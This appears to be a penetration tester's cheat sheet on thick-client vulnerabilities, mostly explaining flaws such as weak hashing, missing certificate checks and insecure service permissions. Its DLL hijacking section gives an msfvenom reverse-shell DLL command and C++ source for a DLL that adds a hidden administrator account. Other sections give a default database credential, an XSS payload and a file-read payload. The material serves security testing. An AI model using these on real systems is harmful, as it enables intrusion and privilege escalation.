# Thick client vulnerabilities

## Index

- [DLL Hijacking](#dll-hijacking)
- [Insecure application design](#insecure-application-design)
- [Weak Hashing Algorithms](#weak-hashing-algorithms)
- [Cleartext secrets in memory](#cleartext-secrets-in-memory)
- [Hardcoded secrets](#hardcoded-secrets)
- [Unsigned binaries](#unsigned-binaries)
- [Lack of verification of the server certificate](#lack-of-verification-of-the-server-certificate)
- [Insecure SSL/TLS configuration](#insecure-ssltls-configuration)
- [Remote Code Execution via Citrix Escape](#remote-code-execution-via-citrix-escape)
- [Direct database access](#direct-database-access)
- [Insecure Windows Service permissions](#insecure-windows-service-permissions)
- [Code injection](#code-injection)
- [Windows persistence](#windows-persistence)
- [Debugging & Development Tools Exposure](#debugging--development-tools-exposure)

## Notes

Resources:
- [Using Burp's Invisible Proxy Settings to Test a Non-Proxy-Aware Thick Client Application](https://portswigger.net/support/using-burp-suites-invisible-proxy-settings-to-test-a-non-proxy-aware-thick-client-application)

## DLL Hijacking

**Tool**
- [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) to see which DLLs are missing for an exe and do DLL Hijacking

**Process**
1. Use winPEAS to enumerate non-Windows services: `.\winPEASany.exe quiet servicesinfo`
2. Enumerate which of these services our user has stop and start access to `.\accesschk.exe /accepteula -uvqc user <service>`
3. Once it's found wich service is vulnerable to dll hijacking, find the executable's path with `sc qc dllsvc`
4. Using Process Monitor, add these the filters to find missing dlls.
   <img src="../img/procmon-config-add.png" alt="procmon-config">
5. Generate a reverse shell DLL named hijackme.dll: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o hijackme.dll`
6. Run again the vulnerable service: `net stop <service>` and `net start dllsvc`

**Another example of a dll**:
```c++
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            // Perform initialization tasks for the DLL when it is loaded
	    
	    int i;
  	    i = system ("net user eviladmin Ev!lpass /add");
  	    i = system ("net localgroup administrators eviladmin /add");
	    
            break;
        case DLL_PROCESS_DETACH:
            // Perform cleanup tasks for the DLL when it is unloaded
            break;
        case DLL_THREAD_ATTACH:
            // Perform initialization tasks for each new thread that loads the DLL
            break;
        case DLL_THREAD_DETACH:
            // Perform cleanup tasks for each thread that unloads the DLL
            break;
    }
    return TRUE;
}
```
- `x86_64-w64-mingw32-gcc dllh.cpp --shared -o dllh.dll`

**Resources**
- [hijacklibs.net](https://hijacklibs.net/)
- [Save the Environment (Variable)](https://www.wietzebeukema.nl/blog/save-the-environment-variables)
- [Spartacus DLL Hijacking](https://github.com/Accenture/Spartacus)



## Insecure application design

The application design is based on a two-tier architecture. In particular, the thick client application installed on the workstation communicates directly with a backend DBMS without the use of an application server.

The best option, from a security perspective, is designing and implementing a three-tier architecture in which the thick client connects with an intermediary layer (an application server), which in turn communicates with the database. A secure channel must be used for all communications, with only secure protocols (such TLS, HTTPS, etc.), and preferebli with Certificate Pinning.

If this is not possible, it is desirable to provide read-only users and read/write users distinct privileges at the DBMS layer. This would stop vertical privilege escalation even if a read-only user were to access the database directly and try to edit the data.



## Weak Hashing Algorithms

Sensitive data exposure, key leakage, broken authentication, insecure sessions, and spoofing attacks can all be caused by improper application of encryption methods. Some hashing or encryption techniques, such MD5 and RC4, are known to be insecure and are not advised for use.

When dealing with hashing algorithms, the strongest algorithm available should be used (e.g., SHA-512 or at least SHA-256). However, it is always crucial to take into account the precise context in which the hashing algorithm must be used. For instance, it is recommended to utilize contemporary hashing algorithms that have been created especially for securely saving passwords when managing passwords. This indicates that they should be slow (as opposed to fast algorithms like MD5 and SHA-1), and that can be configured by changing the work factor (e.g., PBKDF2 or Bcrypt)

If not configured correctly, the encryption can be not sufficiently secure. An example with AES, an algorithm for symmetric encryption:
- Cipher-Block-Chaining (CBC) is no longer considered safe when verifiable padding has been applied without first ensuring the integrity of the ciphertext, except for very specific circumstances. If implemented, it can weakens AES encryption.



## Cleartext secrets in memory

The memory analysis of an application, done when the thick client process is running, can highlight the presence of secrets in cleartext and that can be therefore extracted by any user having access to the machine where the application is hosted.

**Resource**
- [Process Hacker](https://processhacker.sourceforge.io/) It helps to dump the exe memory and see what sensitive data is there



## Hardcoded secrets

Sometimes, the thick client application's source code is not obfuscated, therefore a hostile user may decompile it and easily comprehend every functionality of the application. It's also possible that more can be found, like credentials and api keys.

**Resources**
- [VB Decompiler](https://www.vb-decompiler.org/products.htm) decompile a VB application
- [ILSpy](https://github.com/icsharpcode/ILSpy) | [dnSpy](https://github.com/dnSpy/dnSpy) .NET decompilers



## Unsigned binaries

If an application executable, and/or the imported DLLs, has not been digitally signed, it's possible replace it with a tampered version without the user noticing.

**Resource**
- [Sigcheck](https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck) check the signature of an executable



## Lack of verification of the server certificate

Due to the fact that the client does not verify the TLS certificate presented by the back-end, it's possible to intercept also HTTPS communications managed by the thick client application.

Without effective certificate control, an attacker who is capable of conducting a Man in the Middle attack can provide a self-signed certificate and the application will accept it, invalidating the protection provided by the TLS connection.



## Insecure SSL/TLS configuration

During the SSL/TLS negotiation, SSL/TLS connections may be set up to offer outdated protocols and cipher suites that are susceptible to known security flaws. The data transmitted between the server and the client could potentially be read or modified in this case if an attacker is able to intercept the communication.

**Resource**
- [testssl.sh](https://testssl.sh/) useful for checking outdated ciphers & more



## Remote Code Execution via Citrix Escape

If Citrix is present and you have access to it, there are multiple ways you can achieve Remote Code Execution:
- Try to upload a PowerShell
- Search for a functionality that opens a dialog box. Insert the path for `cmd` and `PowerShell` and see if they pop-up
- In a dialog box, see if the right-click is allowed. Play with the functionality to achieve RCE, like creating a `.bat` and running it or upload files
- Upload [Process Hacker](https://processhacker.sourceforge.io/) and see if you find [Cleartext secrets in memory](#cleartext-secrets-in-memory)

**Resources**
- [PowerShell](https://github.com/PowerShell/Powershell)



## Direct database access

- If it's found that standard users have direct access to the database, there is the possibility for users to read and write data that is not otherwise accessible through the client application.
- If the SQL server requires a Windows User access, use the command `runas /user:localadmin <SQL-SERVER-MANAGEMENT-STUDIO>`
- Try access with the account `sa:RPSsql12345`
- Intercept the requests and see if there is an [Insecure application design](#insecure-application-design). In that case, it might be possible to perform a Direct database access, SQLi or Remote Code Execution

**Resources**
- [Echo Mirage](https://resources.infosecinstitute.com/topic/echo-mirage-walkthrough/)
- [Wireshark](https://www.wireshark.org/)



## Insecure Windows Service permissions

Windows service executable might be configured with insecure permissions. Services configured to use an executable with weak permissions are vulnerable to privilege escalation attacks.

Unprivileged users have the ability to change or replace the executable with arbitrary code, which would then be run the following time the service is launched. This can lead to privilege escalation depending on the user the service is running as.



## Code injection
- Check for classic HTML injections and [XSS](cross-site-scripting-xss)
  - Try to use a `SSID` as a vector for an XSS with a payload like `"/><img src=x onerror=alert(1)>`
- Check if `<webview>` works. If it does, it's might be possible to achieve a LFI with a payload like this `<webview src="file:///etc/passwd"></webview>`. [[Reference](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)]


## Windows persistence

**Resources**
- [persistence-info.github.io](https://persistence-info.github.io/)
- [PayloadsAllTheThings/Windows - Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md)



## Debugging & Development Tools Exposure

Debugging tools and development features left enabled in a production environment can expose sensitive application internals, allow attackers to execute arbitrary commands, or bypass security mechanisms.

### Debugger CEF Exposure

Some applications use the Chromium Embedded Framework (CEF) for rendering web-based components. If CEF debugging is enabled in production, attackers can exploit it to inspect internal processes, execute arbitrary JavaScript, or even interact with system APIs.

- [CEF Documentation](https://bitbucket.org/chromiumembedded/cef/src/master/)
- [CEF Debugger Enabled in Google Web Designer](https://bughunters.google.com/reports/vrp/qMhY4nw9i)
- [taviso/cefdebug](https://github.com/taviso/cefdebug)
